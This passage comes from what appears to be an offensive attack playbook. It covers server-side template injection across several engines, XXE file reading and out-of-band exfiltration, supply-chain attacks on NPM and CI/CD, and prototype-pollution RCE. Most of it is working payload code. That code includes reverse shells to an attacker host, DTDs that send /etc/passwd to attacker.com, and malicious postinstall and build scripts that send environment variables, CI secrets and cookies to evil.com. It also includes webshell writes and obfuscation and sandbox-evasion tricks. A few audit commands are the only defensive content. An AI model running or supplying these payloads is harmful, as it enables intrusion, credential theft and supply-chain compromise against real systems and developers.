**6. 6. Reverse Shell**  _[linux]_
_Obtain a reverse shell_
```
{system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")}
{system("nc -e /bin/sh attacker 4444")}
```

**WAF/EDR Bypass Variants:**

**1. String Concatenation**
_Bypass using string concatenation_
```
{system("i"+"d")}
{system("who"."ami")}
{system("ca"."t /etc/passwd")}
```

**2. Variable Assignment**
_Bypass using variable assignment_
```
{assign var="cmd" value="id"}
{system($cmd)}
{assign var="f" value="sys"."tem"}
{$f("id")}
```

**3. Using PHP Functions**
_WAF bypass techniques_
```
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{PHP function call}
```

---

### Mako Template Injection  `ssti-mako`
Mako template engine injection attack techniques
Subcategory: **Mako** · tags: `ssti` `mako` `python` `template`

**Prerequisites:** uses the Mako template engine; user input rendered directly into the template

**Attack Chain:**

**1. 1. Probe SSTI**
_Probe Mako template injection_
```
${7*7}
${self}
${self.module}
If it outputs 49 or module information, SSTI exists
```

**2. 2. Information Gathering**
_Gather environment information_
```
${self.module.cache.util}
${self.module.cache.util.os}
${dir(self)}
```

**3. 3. Command Execution - os Module**
_Execute commands using the os module_
```
${self.module.cache.util.os.popen("id").read()}
${self.module.cache.util.os.popen("whoami").read()}
${self.module.cache.util.os.system("id")}
```

**4. 4. Command Execution - subprocess**
_Execute commands using subprocess_
```
<%
import subprocess
%>
${subprocess.check_output(["id","-a"])}
${subprocess.Popen(["id"],stdout=subprocess.PIPE).communicate()[0]}
```

**5. 5. Reverse Shell**  _[linux]_
_Obtain a reverse shell_
```
${self.module.cache.util.os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}
```

**WAF/EDR Bypass Variants:**

**1. String Concatenation**
_Bypass using string concatenation_
```
${self.module.cache.util.os.popen("i"+"d").read()}
${self.module.cache.util.os.popen("who"+"ami").read()}
```

**2. Using __import__**
_Import modules using __import___
```
${__import__("os").popen("id").read()}
${__import__("subprocess").check_output(["id"])}
```

**3. Using getattr**
_Bypass using getattr_
```
${getattr(__import__("os"),"popen")("id").read()}
${getattr(getattr(__import__("os"),"popen")("id"),"read")()}
```

---

### Tornado Template Injection  `ssti-tornado`
Tornado template engine injection attack techniques
Subcategory: **Tornado** · tags: `ssti` `tornado` `python` `template`

**Prerequisites:** uses the Tornado template engine; user input rendered directly into the template

**Attack Chain:**

**1. 1. Probe SSTI**
_Probe Tornado template injection_
```
{{7*7}}
{{handler}}
{{request}}
If it outputs 49 or the handler object, SSTI exists
```

**2. 2. Information Gathering**
_Gather environment information_
```
{{handler.settings}}
{{handler.application}}
{{request.headers}}
{{request.cookies}}
```

**3. 3. Command Execution - os**
_Execute commands using the os module_
```
{% import os %}
{{os.popen("id").read()}}
{{os.popen("whoami").read()}}
{{os.system("id")}}
```

**4. 4. Command Execution - subprocess**
_Execute commands using subprocess_
```
{% import subprocess %}
{{subprocess.check_output(["id","-a"])}}
{{subprocess.Popen(["id"],stdout=-1).communicate()[0]}}
```

**5. 5. Reverse Shell**  _[linux]_
_Obtain a reverse shell_
```
{% import os %}
{{os.popen("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"").read()}}
```

**WAF/EDR Bypass Variants:**

**1. String Concatenation**
_Bypass using string concatenation_
```
{% import os %}
{{os.popen("i"+"d").read()}}
{{os.popen("who"+"ami").read()}}
```

**2. Using __import__**
_Import modules using __import___
```
{{__import__("os").popen("id").read()}}
{{__import__("subprocess").check_output(["id"])}}
```

**3. Using handler**
_Access via handler_
```
{{handler.application.settings}}
{{handler.get_status()}}
{{handler.request.remote_ip}}
```

---

### Django Template Injection  `ssti-django`
Django template engine injection attack techniques
Subcategory: **Django** · tags: `ssti` `django` `python` `template`

**Prerequisites:** uses the Django template engine; user input rendered directly into the template

**Attack Chain:**

**1. 1. Probe SSTI**
_Probe Django template injection_
```
{{7*7}}
{% if 1=1 %}vulnerable{% endif %}
{{request}}
If it outputs 49 or the request object, SSTI exists
```

**2. 2. Information Gathering**
_Gather environment information_
```
{{request.META}}
{{request.user}}
{{request.session}}
{{settings.SECRET_KEY}}
```

**3. 3. Command Execution - via settings**
_Try to access via settings_
```
{{settings.TEMPLATES}}
{{settings.DATABASES}}
# Django templates are sandboxed by default, making direct command execution difficult
# need to find an exploitable object chain
```

**4. 4. Command Execution - Object Chain**
_Access via object chains_
```
{{request.user.groups.model._meta.apps}}
{{request.user.user_permissions.model._meta.apps}}
# try to access Django internal objects
```

**5. 5. Sensitive Information Disclosure**
_Leak sensitive configuration_
```
{{settings.SECRET_KEY}}
{{settings.DATABASES}}
{{settings.ALLOWED_HOSTS}}
{{settings.DEBUG}}
```

**WAF/EDR Bypass Variants:**

**1. Using Filters**
_Use Django filters_
```
{{request|length}}
{{settings.SECRET_KEY|default:""}}
{{request.META|dictsort:"key"}}
```

**2. Using a for Loop**
_Iterate using a for loop_
```
{% for key, value in request.META.items %}{{key}}:{{value}}{% endfor %}
{% for k in settings.keys %}{{k}}{% endfor %}
```

---

### ERB Template Injection  `ssti-erb`
ERB (Ruby) template engine injection attack techniques
Subcategory: **ERB** · tags: `ssti` `erb` `ruby` `template`

**Prerequisites:** uses the ERB template engine; user input rendered directly into the template

**Attack Chain:**

**1. 1. Probe SSTI**
_Probe ERB template injection_
```
<%= 7*7 %>
<%= self %>
<%= __FILE__ %>
If it outputs 49 or file information, SSTI exists
```

**2. 2. Information Gathering**
_Gather environment information_
```
<%= Dir.pwd %>
<%= ENV.inspect %>
<%= `id` %>
<%= File.read("/etc/passwd") %>
```

**3. 3. Command Execution - Backticks**
_Execute commands using backticks_
```
<%= `id` %>
<%= `whoami` %>
<%= `cat /etc/passwd` %>
<%= `ls -la` %>
```

**4. 4. Command Execution - system**  _[linux]_
_Execute commands with system/exec and obtain a reverse shell_
```
<%= system("id") %>
<%= system("whoami") %>
<%= exec("id") %>
<%= IO.popen("id").read %>
```

**WAF/EDR Bypass Variants:**

**1. String Concatenation**
_Bypass using string concatenation_
```
<%= `i` + `d` %>
<%= system("wh"+"oami") %>
<%= ("i"+"d").then { |c| system(c) } %>
```

**2. Using %x Syntax**
_Execute commands using %x syntax_
```
<%= %x(id) %>
<%= %x{whoami} %>
<%= %x[cat /etc/passwd] %>
```

**3. Using Open3**
_Use the Open3 module_
```
<%= require "open3"; Open3.popen3("id") { |i,o,e,t| puts o.read } %>
```

---

### Pug/Jade Template Injection  `ssti-pug`
Pug/Jade template engine injection attack techniques
Subcategory: **Pug** · tags: `ssti` `pug` `jade` `nodejs` `template`

**Prerequisites:** uses the Pug/Jade template engine; user input rendered directly into the template

**Attack Chain:**

**1. 1. Probe SSTI**
_Probe Pug template injection_
```
#{7*7}
#{this}
#{global}
If it outputs 49 or the global object, SSTI exists
```

**2. 2. Information Gathering**
_Gather environment information_
```
#{process}
#{process.env}
#{global.process}
#{require}
```

**3. 3. Command Execution - child_process**
_Execute commands using child_process_
```
- var exec = require("child_process").exec
#{exec("id", function(err, stdout, stderr) { console.log(stdout) })}
- require("child_process").exec("id")
```

**4. 4. Command Execution - execSync**
_Execute commands using execSync_
```
- var execSync = require("child_process").execSync
#{execSync("id").toString()}
#{require("child_process").execSync("id").toString()}
```

**5. 5. Reverse Shell**  _[linux]_
_Obtain a reverse shell_
```
- require("child_process").exec("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"")
```

**WAF/EDR Bypass Variants:**

**1. String Concatenation**
_Bypass using string concatenation_
```
- var cmd = "i" + "d"
#{require("child_process").execSync(cmd).toString()}
- var r = "require"
#{global[r]("child_process")}
```

**2. Using global**
_Use the global object_
```
#{global.process.mainModule.require("child_process").execSync("id").toString()}
#{global["req"+"uire"]("child_process")}
```

**3. Using this**
_Use this.constructor_
```
#{this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")}
```

---

### · XXE Entity Injection

### XXE Basic Attack  `xxe-basic`
XML External Entity injection basic attack techniques
Subcategory: **Basic Attack** · tags: `xxe` `xml` `external` `entity`

**Prerequisites:** XML parsing functionality present; external entities not disabled

**Attack Chain:**

**1. 1. Probe XXE**
_Basic XXE test_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

**2. 2. Read Files**  _[windows]_
_Read Windows files_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

**3. 3. Read PHP Source Code**
_Read source code using PHP filters_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

**4. 4. SSRF Attack**
_Perform SSRF via XXE_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

**WAF/EDR Bypass Variants:**

**1. Parameter Entities**
_Bypass using parameter entities_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**2. Encoding Bypass**
_Bypass using encoding_
```
<?xml version="1.0" encoding="UTF-16"?>
Use different encodings to bypass the WAF
```

---

### Blind XXE Attack  `xxe-blind`
Blind (no-echo) XXE attack techniques
Subcategory: **Blind XXE** · tags: `xxe` `blind` `oob` `xml`

**Prerequisites:** XML parsing present; no direct echo

**Attack Chain:**

**1. 1. External Entity Probing**
_Probe using external entities_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">
]>
<foo>&xxe;</foo>
```

**2. 2. Parameter Entities**
_Use parameter entities_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>
```

**3. 3. OOB Data Exfiltration**
_OOB exfiltration of file contents_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
]>
<foo>test</foo>

# xxe.dtd content
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

**WAF/EDR Bypass Variants:**

**1. Encoding Bypass**
_Encoding bypass_
```
Encode the XML document in UTF-16
Bypass WAF detection
```

---

### XXE OOB Exfiltration Attack  `xxe-oob`
Exfiltrate XXE data using OOB techniques
Subcategory: **OOB Exfiltration** · tags: `xxe` `oob` `exfiltration` `xml`

**Prerequisites:** an XXE vulnerability present; can initiate external requests

**Attack Chain:**

**1. 1. HTTP Exfiltration**
_HTTP data exfiltration_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```

**2. 2. FTP Exfiltration**
_FTP data exfiltration_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
```

**3. 3. DNS Exfiltration**
_DNS exfiltration_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://attacker.com/log?file=/etc/passwd">
]>
<foo>&xxe;</foo>

# or use a subdomain
<!ENTITY xxe SYSTEM "http://filecontent.attacker.com/">
```

**WAF/EDR Bypass Variants:**

**1. Using CDATA**
_CDATA wrapping_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo><![CDATA[&xxe;]]></foo>
```

---

### XXE+SSRF Combined Attack  `xxe-ssrf`
Achieve SSRF via XXE
Subcategory: **XXE+SSRF** · tags: `xxe` `ssrf` `combination` `xml`

**Prerequisites:** an XXE vulnerability present; internal network reachable

**Attack Chain:**

**1. 1. Scan Internal Network Ports**
_Scan internal network ports_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<foo>&xxe;</foo>

# batch scanning
<!ENTITY xxe SYSTEM "http://192.168.1.1:80">
<!ENTITY xxe SYSTEM "http://192.168.1.1:443">
```

**2. 2. Access Internal Network Services**
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/info">
]>
<foo>&xxe;</foo>

# access Redis
# access the internal API
```

**WAF/EDR Bypass Variants:**

**1. Encoding Bypass**
_Encoding bypass_
```
Use different encoding formats to bypass IP filtering
```

---

### XXE to RCE  `xxe-rce`
Achieve remote code execution via XXE
Subcategory: **XXE to RCE** · tags: `xxe` `rce` `php` `expect`

**Prerequisites:** an XXE vulnerability present; the PHP expect extension loaded

**Attack Chain:**

**1. 1. Expect Extension RCE**
_Execute commands using the expect protocol_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://whoami">
]>
<foo>&xxe;</foo>

# execute arbitrary commands
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">
```

**2. 2. Write a WebShell**
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://echo '<?php eval($_POST[cmd]);?>' > /var/www/html/shell.php">
]>
<foo>&xxe;</foo>
```

**WAF/EDR Bypass Variants:**

**1. Encoding Bypass**
_Encoding bypass_
```
Use Base64 or other encoding to bypass command filtering
```

---

### XXE File Read  `xxe-file-read`
Read server files via XXE
Subcategory: **File Read** · tags: `xxe` `file` `read` `lfi`

**Prerequisites:** an XXE vulnerability present; has file-read permissions

**Attack Chain:**

**1. 1. Read Linux Files**  _[linux]_
_Read Linux system files_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>

# other sensitive files
file:///etc/shadow
file:///etc/hosts
file:///root/.ssh/id_rsa
file:///proc/self/environ
```

**2. 2. Read Windows Files**  _[windows]_
_Read Windows system files_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>

# other sensitive files
file:///c:/windows/system32/config/sam
file:///c:/users/administrator/.ssh/id_rsa
```

**3. 3. Read Web Configuration**
_Read web application configuration_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<foo>&xxe;</foo>

# common configuration files
file:///var/www/html/wp-config.php
file:///app/.env
file:///app/config/database.yml
```

**4. 4. Read Source Code**
_Read source code using PHP filters_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<foo>&xxe;</foo>
```

**WAF/EDR Bypass Variants:**

**1. Using Parameter Entities**
_Parameter entity bypass_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "file:///etc/passwd">
<!ENTITY bar "%xxe;">
]>
<foo>&bar;</foo>
```

---

### XXE External DTD Exploitation  `xxe-dtd`
Perform XXE attacks using an external DTD file
Subcategory: **External DTD** · tags: `xxe` `dtd` `external` `xml`

**Prerequisites:** an XXE vulnerability present; can access an external DTD

**Attack Chain:**

**1. 1. Host a Malicious DTD**
_Create a malicious DTD file_
```
# create evil.dtd on the attacker's server
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

**2. 2. Reference an External DTD**
_Reference an external DTD file_
```
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>test</foo>
```

**3. 3. Multi-Step Exfiltration**
_Handling special characters_
```
# evil.dtd - multi-step exfiltration
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "%start;%file;%end;">
```

**4. 4. Error Message Leakage**
_Error-message exfiltration_
```
# leak data via error messages
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

# the error message will contain the file contents
```

**WAF/EDR Bypass Variants:**

**1. Using HTTPS**
_HTTPS bypass_
```
Host the DTD file over HTTPS to bypass HTTP filtering
```

---

### XLSX File XXE  `xxe-xlsx`
Perform XXE attacks using an XLSX file
Subcategory: **XLSX File XXE** · tags: `xxe` `xlsx` `excel` `office`

**Prerequisites:** the application parses XLSX files; an XXE vulnerability present

**Attack Chain:**

**1. 1. Unzip the XLSX File**
_Unzip the XLSX file_
```
# an XLSX is essentially a ZIP file
unzip spreadsheet.xlsx

# main file structure
xl/workbook.xml
xl/worksheets/sheet1.xml
xl/sharedStrings.xml
[Content_Types].xml
```

**2. 2. Inject the XXE Payload**
```
# modify xl/workbook.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<workbook xmlns="...">
&xxe;
</workbook>
```

**WAF/EDR Bypass Variants:**

**1. Modify Content_Types**
_Modify Content_Types_
```
Modify [Content_Types].xml to inject XXE
```

---

### DOCX File XXE  `xxe-docx`
Perform XXE attacks using a DOCX file
Subcategory: **DOCX File XXE** · tags: `xxe` `docx` `word` `office`

**Prerequisites:** the application parses DOCX files; an XXE vulnerability present

**Attack Chain:**

**1. 1. Unzip the DOCX File**
_Unzip the DOCX file_
```
# a DOCX is essentially a ZIP file
unzip document.docx

# main file structure
word/document.xml
word/_rels/document.xml.rels
[Content_Types].xml
```

**2. 2. Inject the XXE Payload**
```
# modify word/document.xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="...">
<w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
</w:document>
```

**WAF/EDR Bypass Variants:**

**1. Modify Relationship Files**
_Modify relationship files_
```
Modify _rels/.rels or document.xml.rels to inject XXE
```

---

### · Supply-Chain Attacks

### NPM Package Typosquatting  `supply-typosquat`
Registers a malicious package with a name highly similar to a popular NPM package (e.g. lodash→1odash, colors→co1ors) to trick developers into installing it by mistake. The malicious package executes a reverse shell, steals environment variables, or plants a backdoor in the install/postinstall hooks.
Subcategory: **Package Manager Poisoning** · tags: `supply-chain` `NPM` `Typosquatting` `package-poisoning` `postinstall`

**Prerequisites:** NPM account; knowledge of the target project's dependencies; malicious package infrastructure

**Attack Chain:**

**1. 1. Reconnaissance of Target Dependencies**
_Identify popular NPM packages the target project depends on as typosquatting targets_
```
# analyze the target project's package.json
curl -s "https://raw.githubusercontent.com/{ORG}/{REPO}/main/package.json" | jq '.dependencies, .devDependencies'

# query high-download packages
npm search lodash --json | jq '.[0:5] | .[] | {name, description, version}'
```

**2. 2. Generate Typosquatting Package Names**
_Generate multiple variants similar to the target package name and check availability_
```
# generating common typosquatting variants
original="lodash"
echo "${original}" | python3 -c "
import sys
name=sys.stdin.read().strip()
# character substitution: l->1, o->0
print(name.replace('l','1'))
# hyphen variant
print(name+'-utils')
print(name+'-js')
# missing/extra characters
print(name[:-1])
print(name+'s')
"

# check NPM availability
for pkg in 1odash lodash-utils lodash-js lodas lodashs; do
  npm view $pkg 2>/dev/null && echo "$pkg: TAKEN" || echo "$pkg: AVAILABLE"
done
```

**3. 3. Construct the Malicious Package**
_Create a malicious NPM package disguised as a normal utility library, using the install hook to execute malicious code_
```
# plant a postinstall hook in package.json
{
  "name": "1odash",
  "version": "1.0.0",
  "description": "Utility library for JavaScript",
  "scripts": {
    "preinstall": "node scripts/setup.js",
    "postinstall": "node scripts/telemetry.js"
  }
}

# scripts/telemetry.js — steal environment variables
const https = require('https');
const data = JSON.stringify({
  env: process.env,
  cwd: process.cwd(),
  hostname: require('os').hostname()
});
https.request({hostname:'evil.com',path:'/collect',method:'POST',headers:{'Content-Type':'application/json'}}, ()=>{}).end(data);
```

**4. 4. Detection and Forensics**
_Audit the security of the current project's dependencies, identifying suspicious install hooks and anomalous packages_
```
# audit project dependency security
npm audit --json | jq '.vulnerabilities | to_entries[] | {name: .key, severity: .value.severity}'

# check for postinstall hooks
find node_modules -name "package.json" -exec grep -l "postinstall\|preinstall" {} \;

# compare lock file integrity
npm ci --dry-run 2>&1 | grep -i "warn\|error"

# Socket.dev malicious package detection
npx socket info lodash
```

**WAF/EDR Bypass Variants:**

**1. Bypass NPM Package Security Detection**
_Bypass automated security scanning using delayed execution, code obfuscation, and environment detection_
```
# delayed execution to evade sandbox detection
setTimeout(() => {
  // malicious code executes after 30 seconds, bypassing automated-analysis timeouts
  require('child_process').exec('curl evil.com/c | sh')
}, 30000);

# code obfuscation
const _0x4f2a=['\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'];
require(_0x4f2a[0]).exec('...');

# environment detection — only triggers in CI/CD
if(process.env.CI || process.env.GITHUB_ACTIONS) {
  // only attack CI/CD environments
}
```

---

### CI/CD Pipeline Poisoning  `supply-ci-poison`
Attacks the CI/CD pipeline via malicious Pull Requests, Actions injection, or build-script tampering. The attacker can steal build secrets, poison build artifacts, or plant backdoor code in the deployment process.
Subcategory: **CI/CD Attack** · tags: `supply-chain` `CI/CD` `GitHub Actions` `Jenkins` `Pipeline`

**Prerequisites:** the target uses public CI/CD; can submit PRs or fork

**Attack Chain:**

**1. 1. Identify CI/CD Configuration**
_Analyze the target project's CI/CD configuration files and secret usage_
```
# search for GitHub Actions configuration
curl -s "https://api.github.com/repos/{ORG}/{REPO}/contents/.github/workflows" \
  -H "Authorization: token {GITHUB_TOKEN}" | jq '.[].name'

# analyze secret usage in the workflow
curl -s "https://raw.githubusercontent.com/{ORG}/{REPO}/main/.github/workflows/ci.yml" | grep -E "secrets\.|\$\{\{.*\}\}"
```

**2. 2. PR-Triggered Workflow Injection**
_Use the pull_request_target event to execute PR code in the main repo context and steal Secrets_
```
# malicious .github/workflows/pr-check.yml
name: PR Check
on:
  pull_request_target:  # dangerous: executes in the main-repo context
    types: [opened, synchronize]
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: |
          # code from the PR executes with main-repo privileges
          echo ${{ secrets.DEPLOY_KEY }} | base64 -w0
          curl -X POST -d @<(env) https://evil.com/collect
```

**3. 3. Actions Expression Injection**
_Inject commands into the GitHub Actions run step via the PR title / Issue comment_
```
# PR title injection
# create a PR with the following title:
# test`curl evil.com/s|sh`

# injection exists if the workflow is written like this:
run: echo "Checking PR: ${{ github.event.pull_request.title }}"

# Issue comment injection
# comment content:
# "); curl evil.com/steal?token=$GITHUB_TOKEN #

# search for injection points
grep -rn '\${{.*github\.event\.' .github/workflows/
```

**4. 4. Build Artifact Poisoning**
_Inject malicious code (such as a cookie-stealing script) into artifacts during the build process_
```
# tamper with the build script to inject a backdoor
# modify the package.json build script
"scripts": {
  "build": "react-scripts build && node inject.js"
}

# inject.js — inject code into the build artifact
const fs = require('fs');
const buildDir = './build/static/js';
fs.readdirSync(buildDir).filter(f=>f.endsWith('.js')).forEach(f => {
  let code = fs.readFileSync(`${buildDir}/${f}`, 'utf8');
  code += '\n;fetch("https://evil.com/log?c="+document.cookie);';
  fs.writeFileSync(`${buildDir}/${f}`, code);
});
```

**WAF/EDR Bypass Variants:**

**1. Bypass GitHub Actions Security Restrictions**
_Bypass log auditing and security policies via indirect triggering, third-party Actions, and Python exfiltration_
```
# trigger indirectly using workflow_dispatch
# avoid directly exposing malicious code in the PR
on:
  workflow_dispatch:
    inputs:
      cmd:
        description: "Command"
        required: true
steps:
  - run: ${{ github.event.inputs.cmd }}

# use a third-party Action as a pivot
- uses: malicious-org/innocent-name@main
  # the malicious Action internally steals secrets

# environment-variable leakage — avoid a direct echo
- run: |
    python3 -c "import os,urllib.request;urllib.request.urlopen(urllib.request.Request('https://evil.com',data=str(dict(os.environ)).encode()))"
```

---

### Dependency Confusion Attack  `supply-dependency-confusion`
Exploits the resolution-priority flaw in package managers between public and private registries. When an enterprise uses internal package names, the attacker registers a same-named package with a higher version on the public NPM/PyPI, and the package manager preferentially installs the higher public version, thereby executing malicious code.
Subcategory: **Dependency Confusion** · tags: `supply-chain` `dependency-confusion` `NPM` `PyPI` `Dependency Confusion`

**Prerequisites:** known target internal package names; a public registry account

**Attack Chain:**

**1. 1. Discover Internal Package Names**
_Discover internal package names used by the target from front-end code, leaked lock files, and error messages_
```
# extract import paths from JavaScript source
curl -s "https://{TARGET}/static/js/main.js" | grep -oP "require\([\x27\x22]@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+[\x27\x22]\)" | sort -u

# search from a leaked package-lock.json
curl -s "https://{TARGET}/package-lock.json" 2>/dev/null | jq 'keys' 

# search GitHub for private package names
# search: "@internal-company/" site:github.com

# discover from error pages / source comments
curl -s "https://{TARGET}" | grep -oE "@[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+"
```

**2. 2. Register a Same-Named Package on the Public Registry**
_Publish a package on the public NPM registry with the same name as the target's internal package but a higher version_
```
# create a public package with the same name as the internal package
mkdir dependency-confusion-test && cd dependency-confusion-test
npm init -y
# set an extremely high version number
npm version 99.0.0

# add harmless detection code (non-malicious)
cat > index.js << 'EOF'
const os = require("os");
const dns = require("dns");
const pkg = require("./package.json");
// DNS callback only to confirm installation — no data exfiltration
dns.resolve(`${pkg.name}.${os.hostname()}.dep-test.example.com`, ()=>{});
EOF

npm publish --access public
```

**3. 3. Monitor DNS Callbacks to Confirm the Hit**
_Monitor DNS/HTTP callbacks to confirm the target environment installed the malicious package from the public registry_
```
# monitor using Burp Collaborator or a self-hosted DNS server
# Interactsh monitoring
interactsh-client -v 2>&1 | grep "dep-test"

# self-hosted DNS record
sudo tcpdump -i eth0 port 53 -l | grep "dep-test"

# can also use an HTTP callback
python3 -m http.server 8080 &
# wait for the target CI/CD pipeline to install the package and trigger the callback
```

**4. 4. Impact Assessment and Reporting**
_Verify the package manager's resolution-priority behavior and assess the impact scope_
```
# verify the affected package manager behavior
# NPM: prefers the higher public version by default
npm install @target-corp/utils --registry https://registry.npmjs.org -dd 2>&1 | grep "resolved"

# same applies to Python/pip
pip install target-corp-utils --index-url https://pypi.org/simple/ -v 2>&1 | grep "Downloading"

# check whether a registry scope is configured
npm config get @target-corp:registry
```

**WAF/EDR Bypass Variants:**

**1. Bypass Package Name Registration Restrictions**
_Expand the attack surface using unscoped package names, cross-package-manager attacks, and prerelease versions_
```
# if the target uses unscoped package names
# directly register a same-named public package (without an @scope prefix, easier to confuse)

# cross-package-manager attack
# the target uses NPM, but also try PyPI
pip install target-internal-lib  # pip has no scope concept

# use a prerelease tag
npm version 99.0.0-alpha.1
# some configurations match the >=1.0.0 range, including prereleases
```

---

### · Prototype Pollution

### Server-Side Prototype Pollution to RCE  `proto-server-rce`
Injects malicious properties by polluting the JavaScript object prototype chain (__proto__/constructor.prototype), achieving remote code execution on the Node.js server side via child_process or the gadget chains of template engines such as EJS/Pug.
Subcategory: **Server-Side Exploitation** · tags: `prototype-chain` `Prototype Pollution` `RCE` `Node.js` `__proto__`

**Prerequisites:** the target uses Node.js; JSON merge/deep-copy operations present; controllable JSON input

**Attack Chain:**

**1. 1. Detect Prototype Pollution Points**
_Test for prototype pollution via both __proto__ and constructor.prototype_
```
# send a __proto__ pollution test
curl -X POST "https://{TARGET}/api/update" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "test123"}}'

# constructor approach
curl -X POST "https://{TARGET}/api/merge" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"polluted": "test123"}}}'

# verify whether the pollution succeeded (via errors / behavior changes)
curl "https://{TARGET}/api/debug" | grep "polluted"
```

**2. 2. EJS Template Engine RCE Gadget**
_Achieve RCE using the EJS template engine's outputFunctionName/escapeFunction gadget_
```
# EJS RCE gadget — pollute outputFunctionName
curl -X POST "https://{TARGET}/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id\");x"}}'

# trigger template rendering
curl "https://{TARGET}/dashboard"

# EJS client parameter RCE
curl -X POST "https://{TARGET}/api/config" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"client": true, "escapeFunction": "1;return process.mainModule.require(\"child_process\").execSync(\"id\")"}}'
```

**3. 3. Pug Template Engine RCE Gadget**
_Achieve code execution using known gadget chains in the Pug and Handlebars template engines_
```
# Pug/Jade RCE gadget — pollute the block property
curl -X POST "https://{TARGET}/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"block": {"type": "Text", "val": "x]));process.mainModule.require(\"child_process\").execSync(\"curl evil.com/rce\");//"}}}'

# Handlebars RCE gadget
curl -X POST "https://{TARGET}/api/template" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"allowedProtoMethods": {"__defineGetter__": true}, "allowedProtoProperties": {"__defineGetter__": true}}}'
```

